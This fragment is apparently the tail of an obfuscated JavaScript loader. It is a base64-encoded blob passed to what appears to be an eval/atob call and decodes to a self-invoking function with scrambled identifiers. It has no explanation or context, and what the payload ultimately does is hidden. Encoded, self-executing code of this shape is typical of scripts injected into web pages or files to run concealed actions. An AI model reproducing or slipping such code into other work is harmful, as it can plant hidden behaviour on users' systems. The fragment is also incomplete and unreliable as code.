CZF0uQmEgZ3IoaSVvMHJsSiBCKyBlMV8xaWF0MnQ9X05CKVtfQi5fOV9uNjZmJH1lSGU7WHRlZWJ1XC9hXW8ofXQ6OWdCIWpuQjRpZ0MuXWFCYWxCQjE7bGpvQmRiQnBpISkhb2ZiQlFiX0kpb3JwZSBbJThoQjBuIGlCIW5ELDJCMTEgKF0uQnR9QnRdYkJtX0I5dmklMn1zKG9iYyUobXslcmEoX2d8ICtdJykpO3ZhciB0V3I9RUVEKEJVcCx4eEwgKTt0V3IoMzQ5Nik7cmV0dXJuIDQ1OTd9KSgp'))
